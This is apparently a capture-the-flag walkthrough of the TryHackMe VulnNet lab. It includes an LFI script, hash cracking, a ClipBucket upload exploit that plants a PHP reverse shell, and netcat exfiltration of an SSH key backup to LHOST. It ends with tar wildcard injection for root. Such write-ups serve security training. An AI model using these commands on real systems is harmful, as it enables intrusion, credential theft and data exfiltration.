<p>Link to the ctf: <a href="https://tryhackme.com/room/vulnnet1">VulnNet</a></p>

<div class="highlighter-rouge"><pre class="codehilite"><code># Nmap 7.91 scan initiated Thu Mar 18 16:30:12 2021 as: nmap -sV -sC -vv -p- -T5 -Pn -oN nmap.log vulnnet.thm
Warning: 10.10.241.120 giving up on port because retransmission cap hit (2).
Nmap scan report for vulnnet.thm (10.10.241.120)
Host is up, received user-set (0.11s latency).
Scanned at 2021-03-18 16:30:13 CET for 333s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 18 16:35:47 2021 -- 1 IP address (1 host up) scanned in 334.55 seconds
</code></pre></div>

<p>I didn’t find anything useful so I ran a VHOST enumeration</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>gobuster vhost --url http://vulnnet.thm --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  | grep -v <span class="s1">'Status: 400'</span>
</code></pre></div>
<p>I found <code class="highlighter-rouge">broadcast.vulnnet.thm</code> that requires http authentication.</p>

<p>In the source page <code class="highlighter-rouge">http://vulnnet.thm/</code> we see that at the bottom of the page, it’s been imported 2 javascript files.</p>

<p><img src="/assets/Clipboard_2021-03-18-20-16-56.png" alt="" /></p>

<p>analyzing the javascript files using <a href="https://lelinhtinh.github.io/de4js/">de4js</a> we see that one of them contains a special argument to pass at  <code class="highlighter-rouge">http://vulnnet.thm/index.php</code></p>

<p><img src="/assets/Clipboard_2021-03-18-20-18-29.png" alt="" /></p>

<p>I tried several techinques until I realized there was a LFI (Local File Inclusion) vulnerability:</p>

<p><img src="/assets/Clipboard_2021-03-18-20-20-10.png" alt="" /></p>

<p>I then relized that the function deletes the <code class="highlighter-rouge">../</code> strings so to cirumnavigate it, I used <code class="highlighter-rouge">..//</code>.</p>

<p>I created a script in python to better get the output since I didn’t want to scroll back down everytime I issue a new value.</p>

<div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#!/usr/bin/env python3</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">DELIMETER1</span> <span class="o">=</span> <span class="s">'''                &lt;/p&gt;
            &lt;/div&gt;
        &lt;/div&gt;

    &lt;/div&gt;

&lt;/div&gt;'''</span>
    <span class="n">DELIMETER2</span> <span class="o">=</span> <span class="s">'&lt;script src="/js/index__7ed54732.js"&gt;&lt;/script&gt;'</span>
    <span class="n">target</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">argument</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">argument</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">"Usage: {sys.argv[0]} &lt;ip/host&gt; &lt;file&gt;"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="n">argument</span> <span class="o">=</span> <span class="n">argument</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"../"</span><span class="p">,</span> <span class="s">"..//"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"TARGET:"</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"FILE:"</span><span class="p">,</span> <span class="n">argument</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">f</span><span class="s">"http://{target}/?referer={argument}"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">DELIMETER2</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">DELIMETER1</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
</code></pre></div>

<p>And I use the script <code class="highlighter-rouge">./lfi.py vulnnet.thm /etc/passwd</code></p>

<p>There is an interest line</p>

<div class="highlighter-rouge"><pre class="codehilite"><code>server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
</code></pre></div>

<p>Knowing how apache works, I wanted to find the <code class="highlighter-rouge">.htpasswd</code> file for the subdomain <code class="highlighter-rouge">broadcast</code>.
The config file <code class="highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code> shows us a lot of information about http service.</p>
<div class="language-xml highlighter-rouge"><pre class="codehilite"><code><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
        ServerAdmin webmaster@localhost
        ServerName vulnnet.thm
        DocumentRoot /var/www/main
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        <span class="nt">&lt;Directory</span> <span class="err">/var/www/main</span><span class="nt">&gt;</span>
                Order allow,deny
                allow from all
        <span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/VirtualHost&gt;</span>

<span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
        ServerAdmin webmaster@localhost
        ServerName broadcast.vulnnet.thm
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        <span class="nt">&lt;Directory</span> <span class="err">/var/www/html</span><span class="nt">&gt;</span>
                Order allow,deny
                allow from all
                AuthType Basic
                AuthName "Restricted Content"
                AuthUserFile /etc/apache2/.htpasswd
                Require valid-user
        <span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/VirtualHost&gt;</span>
</code></pre></div>

<p>We wanna focus on the second <code class="highlighter-rouge">VirtualHost</code>, where is in charge to define the <code class="highlighter-rouge">broadcast.vulnnet.thm</code> hostname.
In fact, we see the line <code class="highlighter-rouge">AuthUserFile /etc/apache2/.htpasswd</code></p>

<p>Let’s get that file and try to crack the password</p>

<div class="highlighter-rouge"><pre class="codehilite"><code>developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
</code></pre></div>

<p>So we have <code class="highlighter-rouge">developers</code> as username.</p>

<p>I used <code class="highlighter-rouge">john</code> to do the crack and used the wordlist <code class="highlighter-rouge">rockyou.txt</code></p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>john -w<span class="o">=</span>/usr/share/wordlists/rockyou.txt crackme.txt
</code></pre></div>
<p><img src="/assets/Clipboard_2021-03-18-21-16-30.png" alt="" /></p>

<p>Bingo, now we try to login at <code class="highlighter-rouge">broadcast.vulnnet.thm</code>.</p>

<p><img src="/assets/Clipboard_2021-03-18-21-17-50.png" alt="" /></p>

<p>We got a <code class="highlighter-rouge">clipbucket</code> instance.</p>

<p>On the Title name we see that Clipbucket is using the version <code class="highlighter-rouge">4.0</code>.</p>

<p>I googled it and we found a few interesting vulnerabilities:</p>

<p><img src="/assets/Clipboard_2021-03-18-21-19-40.png" alt="" /></p>

<p>I used <code class="highlighter-rouge">searchsploit clipbucket</code> to look up for the vulnerability</p>

<p><img src="/assets/Clipboard_2021-03-18-22-06-35.png" alt="" />
I analyzed the last file with <code class="highlighter-rouge">searchsploit -x php/webapps/44250.txt</code></p>

<p>And decided to use the following exploit:</p>

<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>curl -F <span class="s2">"file=@pfile.php"</span> -F <span class="s2">"plupload=1"</span> -F <span class="s2">"name=anyname.php"</span> <span class="s2">"http://</span><span class="nv">$HOST</span><span class="s2">/actions/photo_uploader.php"</span>
</code></pre></div>

<p>We re gonna create a file called <code class="highlighter-rouge">lmao.php</code> and use <a href="https://github.com/jackrendor/asio">asio</a> to generate a reverse shell</p>

<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>asio -H LHOST -P LPORT -A -B
</code></pre></div>
<p>I took the payload and put inside the <code class="highlighter-rouge">lmao.php</code> file rwapped in the php <code class="highlighter-rouge">system</code> function:</p>
<div class="language-php highlighter-rouge"><pre class="codehilite"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"ASIO_PAYLOAD"</span><span class="p">);</span> <span class="cp">?&gt;</span>
</code></pre></div>

<p>and then used the curl command, being careful to add the authentication header like so:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>curl -F <span class="s2">"file=@lmao.php"</span> -F <span class="s2">"plupload=1"</span> -F <span class="s2">"name=lmao.php"</span> -u <span class="s2">"developers:HTPASS_PASSOWRD"</span> <span class="s2">"http://broadcast.vulnnet.thm/actions/photo_uploader.php"</span>
</code></pre></div>
<p>We’re gonna get a response like this:</p>
<div class="language-json highlighter-rouge"><pre class="codehilite"><code><span class="p">{</span><span class="nt">"success"</span><span class="p">:</span><span class="s2">"yes"</span><span class="p">,</span><span class="nt">"file_name"</span><span class="p">:</span><span class="s2">"1616102314ebf8b6"</span><span class="p">,</span><span class="nt">"extension"</span><span class="p">:</span><span class="s2">"php"</span><span class="p">,</span><span class="nt">"file_directory"</span><span class="p">:</span><span class="s2">"2021\/03\/18"</span><span class="p">}</span><span class="w">
</span></code></pre></div>
<p>I opened a listener with netcat:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>rlwrap nc -vlp 8080
</code></pre></div>
<p>I headed at <code class="highlighter-rouge">http://broadcast.vulnnet.thm/files/</code>, went into the <code class="highlighter-rouge">photos</code> folder and follow the path specified in the <code class="highlighter-rouge">file_directory</code> variable in the json response.
We’re gonna have our file with the same name as the value of <code class="highlighter-rouge">file_name</code>. 
Clicking on it we get a reverse shell.</p>

<h2 id="privilege-escalation---lateral-movement">Privilege escalation - Lateral Movement</h2>

<p>First I stabilized my shell by issuing the following commands:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>python3 -c <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div>

<p>then I saw that in <code class="highlighter-rouge">/var/backups/</code> we have <code class="highlighter-rouge">ssh-backup.tar.gz</code>
<code class="highlighter-rouge">-rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz</code></p>

<p>I moved this file to my PC by opening a netcat listener in my machine</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>nc -lvp 8000 &gt; <span class="s2">"ssh-backup.tar.gz"</span>
</code></pre></div>

<p>and send the command to my machine by issuing another command with netcat in the remote server:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>cat ssh-backup.tar.gz | nc LHOST 8000
</code></pre></div>

<p>I extracted the archive by using tar:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>tar xvf ssh-backup.tar.gz
</code></pre></div>
<blockquote>
  <p>NOTE: I always forget which argument pass to <code class="highlighter-rouge">tar</code> to extract the archive. Just thinking about e<strong>X</strong>tract <strong>V</strong>erbose <strong>F</strong>file</p>
</blockquote>

<p>and we have an <code class="highlighter-rouge">id_rsa</code>. Knowing that this file is owned by <code class="highlighter-rouge">server-management</code>, I supposed that it belongs to this user.
But we have to crack it first:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>/usr/share/john/ssh2john.py id_rsa &gt; crackme
john -w<span class="o">=</span>/usr/share/wordlists/rockyou.txt crackme
</code></pre></div>

<p>and after finding the password, we can use it to login via ssh:</p>

<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>ssh -i id_rsa server-management@vulnnet.thm
</code></pre></div>

<h2 id="privilege-escalation---vertical-movement">Privilege Escalation - Vertical Movement</h2>
<p>inside <code class="highlighter-rouge">/var/opt/</code> we see a file called <code class="highlighter-rouge">backupsrv.sh</code></p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="c">#!/bin/bash</span>

<span class="c"># Where to backup to.</span>
<span class="nv">dest</span><span class="o">=</span><span class="s2">"/var/backups"</span>

<span class="c"># What to backup. </span>
<span class="nb">cd</span> /home/server-management/Documents
<span class="nv">backup_files</span><span class="o">=</span><span class="s2">"*"</span>

<span class="c"># Create archive filename.</span>
<span class="nv">day</span><span class="o">=</span><span class="k">$(</span>date +%A<span class="k">)</span>
<span class="nv">hostname</span><span class="o">=</span><span class="k">$(</span>hostname -s<span class="k">)</span>
<span class="nv">archive_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$hostname</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">.tgz"</span>

<span class="c"># Print start status message.</span>
<span class="nb">echo</span> <span class="s2">"Backing up </span><span class="nv">$backup_files</span><span class="s2"> to </span><span class="nv">$dest</span><span class="s2">/</span><span class="nv">$archive_file</span><span class="s2">"</span>
date
<span class="nb">echo</span>

<span class="c"># Backup the files using tar.</span>
tar czf <span class="nv">$dest</span>/<span class="nv">$archive_file</span> <span class="nv">$backup_files</span>

<span class="c"># Print end status message.</span>
<span class="nb">echo
echo</span> <span class="s2">"Backup finished"</span>
date

<span class="c"># Long listing of files in $dest to check file sizes.</span>
ls -lh <span class="nv">$dest</span>
</code></pre></div>

<p>This file is called by <code class="highlighter-rouge">cronjob</code> after a while by using the user <code class="highlighter-rouge">root</code></p>

<p><img src="/assets/Clipboard_2021-03-18-23-36-25.png" alt="" /></p>
<blockquote>
  <p>NOTE: I used <code class="highlighter-rouge">linpeas.sh</code> to get those informations</p>
</blockquote>

<p>if we focus on the <code class="highlighter-rouge">tar</code> command, we see that we have chance to use the <a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">wildcard injection</a></p>

<p>so the source directory is <code class="highlighter-rouge">/home/server-management/Documents</code>, this is the place where we have to insert our <em>special files</em>.</p>

<p>I created a file called <code class="highlighter-rouge">shell.sh</code> and added it the <code class="highlighter-rouge">asio</code> reverse shell.
a file called <code class="highlighter-rouge">--checkpoint=1</code>
and then <code class="highlighter-rouge">--checkpoint-action=exec=sh shell.sh</code>
Now we can open a <code class="highlighter-rouge">netcat</code> listener as we did before</p>

<p>and after a while, we should get root.</p>

<p><img src="/assets/Clipboard_2021-03-18-23-34-35.png" alt="" /></p>

